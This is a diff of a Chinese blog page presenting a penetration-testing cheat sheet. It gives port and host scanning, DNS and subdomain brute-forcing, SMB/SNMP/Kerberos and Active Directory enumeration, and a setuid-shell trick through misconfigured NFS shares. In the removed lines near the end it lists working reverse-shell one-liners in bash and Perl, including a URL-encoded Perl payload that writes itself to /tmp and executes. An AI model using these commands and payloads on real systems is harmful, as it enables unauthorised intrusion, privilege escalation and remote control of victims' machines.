@@ -1,339 +1,456 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>渗透测试速查表 | 忘返</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="侦察存活IP扫描1nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;&#x2F;open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips 批量Ping1234#!&#x2F;bin&#x2F;bashfor lastOctet in &amp;#123;1..254&amp;#125;">
-<meta property="og:type" content="article">
-<meta property="og:title" content="渗透测试速查表">
-<meta property="og:url" content="https://7mitu.github.io/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/index.html">
-<meta property="og:site_name" content="忘返">
-<meta property="og:description" content="侦察存活IP扫描1nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;&#x2F;open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips 批量Ping1234#!&#x2F;bin&#x2F;bashfor lastOctet in &amp;#123;1..254&amp;#125;">
-<meta property="og:locale">
-<meta property="article:published_time" content="2020-11-08T04:52:24.000Z">
-<meta property="article:modified_time" content="2022-12-08T02:29:47.726Z">
-<meta property="article:author" content="忘返">
-<meta property="article:tag" content="CheckList">
-<meta property="article:tag" content="渗透测试">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="忘返" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="懒"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>渗透测试速查表 | 忘返</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">忘返</a></h1></div><p class="m-desc">心之所向，无惧无悔,<br>愿求仁得仁，复无怨怼！</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">渗透测试速查表</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/">2020-11-08</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><pre><code class="shell">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips
+</code></pre>
+<h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><pre><code class="shell">#!/bin/bash
+for lastOctet in &#123;1..254&#125;; do 
+    ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;
+done
+</code></pre>
+<h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><pre><code class="shell">nc -v $TARGET 80
+telnet $TARGET 80
+curl -vX $TARGET
+</code></pre>
+<h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><pre><code class="shell">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
+</code></pre>
+<h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><pre><code class="shell">nc -nvv -w 1 -z host 1000-2000
+nc -nv -u -z -w 1 host 160-162
+</code></pre>
+<h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><pre><code class="shell">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0
+</code></pre>
+<h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><pre><code class="shell">whois domain.com
+dig &#123;a|txt|ns|mx&#125; domain.com
+dig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.com
+host -t &#123;a|txt|ns|mx&#125; megacorpone.com
+host -a megacorpone.com
+host -l megacorpone.com ns1.megacorpone.com
+dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
+dnsenum domain.com
+nslookup -&gt; set type=any -&gt; ls -d domain.com
+for sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done
+</code></pre>
+<h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><pre><code class="shell">#列出NFS共享，如果存在&#39;rw,no_root_squash&#39;，可上传并执行sid-shell
+showmount -e 192.168.110.102
+chown root:root sid-shell; chmod +s sid-shell
+</code></pre>
+<h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><pre><code class="shell"># users
+nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;
+</code></pre>
+<h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><pre><code class="shell">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
+target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
+target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
+</code></pre>
+<h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><pre><code class="shell">rpcinfo -p $TARGET
+nbtscan $TARGET
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+#list shares
+smbclient -L //$TARGET -U &quot;&quot;
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+# null session
+rpcclient -U &quot;&quot; $TARGET
+smbclient -L //$TARGET
+enum4linux $TARGET
+</code></pre>
+<h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><pre><code class="shell"># Windows User Accounts
+snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25
 
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+# Windows Running Programs
+snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">忘返</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">天涯游子，一梦黄粱</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://7mitu.github.io"></form>
-      </div>
-    </div>
-  </div>
-</header>
+# Windows Hostname
+snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5
 
-      <div class="outer">
-        <section id="main"><article id="post-渗透测试速查表" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/" class="article-date">
-  <time class="dt-published" datetime="2020-11-08T04:52:24.000Z" itemprop="datePublished">2020-11-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      渗透测试速查表
-    </h1>
-  
+# Windows Share Information
+snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</span><br></pre></td></tr></table></figure>
-<h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for lastOctet in &#123;1..254&#125;; do </span><br><span class="line">    ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-<h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -v $TARGET 80</span><br><span class="line">telnet $TARGET 80</span><br><span class="line">curl -vX $TARGET</span><br></pre></td></tr></table></figure>
-<h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done</span><br></pre></td></tr></table></figure>
-<h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -w 1 -z host 1000-2000</span><br><span class="line">nc -nv -u -z -w 1 host 160-162</span><br></pre></td></tr></table></figure>
-<h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</span><br></pre></td></tr></table></figure>
-<h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whois domain.com</span><br><span class="line">dig &#123;a|txt|ns|mx&#125; domain.com</span><br><span class="line">dig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.com</span><br><span class="line">host -t &#123;a|txt|ns|mx&#125; megacorpone.com</span><br><span class="line">host -a megacorpone.com</span><br><span class="line">host -l megacorpone.com ns1.megacorpone.com</span><br><span class="line">dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com</span><br><span class="line">dnsenum domain.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d domain.com</span><br><span class="line">for sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</span><br></pre></td></tr></table></figure>
-<h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出NFS共享，如果存在<span class="string">&#x27;rw,no_root_squash&#x27;</span>，可上传并执行sid-shell</span></span><br><span class="line">showmount -e 192.168.110.102</span><br><span class="line">chown root:root sid-shell; chmod +s sid-shell</span><br></pre></td></tr></table></figure>
-<h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">users</span></span></span><br><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#x27;test&#x27;</span><br></pre></td></tr></table></figure>
-<h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster</span><br><span class="line">target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto</span><br><span class="line">target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</span><br></pre></td></tr></table></figure>
-<h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p $TARGET</span><br><span class="line">nbtscan $TARGET</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">list shares</span></span><br><span class="line">smbclient -L //$TARGET -U &quot;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">null session</span></span><br><span class="line">rpcclient -U &quot;&quot; $TARGET</span><br><span class="line">smbclient -L //$TARGET</span><br><span class="line">enum4linux $TARGET</span><br></pre></td></tr></table></figure>
-<h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows User Accounts</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Running Programs</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Hostname</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Share Information</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Share Information</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows TCP Ports</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Software Name</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">brute-force community strings</span></span><br><span class="line">onesixtyone -i snmp-ips.txt -c community.txt</span><br><span class="line"></span><br><span class="line">snmp-check $TARGET</span><br></pre></td></tr></table></figure>
-<h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</span><br></pre></td></tr></table></figure>
-<h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">current domain info</span></span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">domain trusts</span></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">current forest info</span></span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get forest trust relationships</span></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#x27;Forest&#x27;, &#x27;forest-of-interest.local&#x27;)))).GetAllTrustRelationships()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get DCs of a domain</span></span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get DC <span class="keyword">for</span> currently authenticated session</span></span><br><span class="line">nltest /dsgetdc:offense.local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get domain trusts from cmd shell</span></span><br><span class="line">nltest /domain_trusts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get user info</span></span><br><span class="line">nltest /user:&quot;spotless&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get DC <span class="keyword">for</span> currently authenticated session</span></span><br><span class="line">set l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get domain name and DC the user authenticated to</span></span><br><span class="line">klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get all logon sessions. Includes NTLM authenticated sessions</span></span><br><span class="line">klist sessions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kerberos tickets <span class="keyword">for</span> the session</span></span><br><span class="line">klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cached krbtgt</span></span><br><span class="line">klist tgt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span> on older Windows systems</span></span><br><span class="line">set u</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find DFS shares with ADModule</span></span><br><span class="line">Get-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find DFS shares with ADSI</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s=[adsisearcher]<span class="string">&#x27;(name=*)&#x27;</span>; <span class="variable">$s</span>.SearchRoot = [adsi]<span class="string">&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;</span>; <span class="variable">$s</span>.FindAll() | % &#123;<span class="variable">$_</span>.properties.name&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">check <span class="keyword">if</span> spooler service is running on a host</span></span><br><span class="line">powershell ls &quot;\\dc01\pipe\spoolss&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start listener on port 443</span></span><br><span class="line"><span class="variable">$listener</span> = [<span class="type">System.Net.Sockets.TcpListener</span>]<span class="number">443</span>; <span class="variable">$listener</span>.Start();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="variable">$listener</span>.AcceptTcpClient();</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="variable">$client</span>.client.RemoteEndPoint <span class="string">&quot;connected!&quot;</span>;</span><br><span class="line">    <span class="variable">$client</span>.Close();</span><br><span class="line">    <span class="built_in">start-sleep</span> <span class="literal">-seconds</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+# Windows Share Information
+snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27
 
-<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">URL-Encoded Perl: Linux</span></span><br><span class="line"><span class="meta prompt_">echo%</span><span class="language-bash">20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</span></span><br></pre></td></tr></table></figure>
